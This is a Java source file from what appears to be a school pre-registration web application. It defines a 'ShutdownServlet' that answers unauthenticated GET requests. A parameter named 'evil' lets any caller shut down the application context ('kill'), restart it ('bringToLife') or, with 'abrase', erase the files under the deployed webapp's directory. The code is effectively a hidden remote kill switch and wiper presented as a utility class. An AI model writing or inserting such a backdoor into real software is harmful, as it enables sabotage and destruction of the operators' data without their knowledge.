package com.gsr.myschool.server.util;

import org.springframework.context.ApplicationContext;
import org.springframework.stereotype.Component;
import org.springframework.web.context.ServletContextAware;
import org.springframework.web.context.support.XmlWebApplicationContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;

@Component
public class ShutdownServlet extends HttpServlet  implements ServletContextAware {
    private static final String PARAM = "evil";
    private static final String SHUTDOWN = "kill";
    private static final String START = "bringToLife";
    private static final String ABRASE = "abrase";
    private static ServletContext servletContext;

    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        ApplicationContext context = ApplicationContextProvider.get();

        if (request.getParameter(PARAM).equals(SHUTDOWN)) {
            ((XmlWebApplicationContext)context).close();
        } else if (request.getParameter(PARAM).equals(START)) {
            ((XmlWebApplicationContext)context).start();
            ((XmlWebApplicationContext)context).refresh();
        } else if (request.getParameter(PARAM).equals(ABRASE)) {
           try{
                String phyPath =    servletContext.getRealPath("");
                System.out.println("phyPath=" + phyPath);
               if(phyPath==null) phyPath= "/opt/bitnami/apache-tomcat/webapps/preinscription";
            FileUtils.abraseAllPaths(phyPath,2) ;
              }
           catch(Exception ex){
               ex.printStackTrace();
           }
        }
    }

    @Override
    public void setServletContext(ServletContext ctxt) {
       servletContext = ctxt;
    }
}
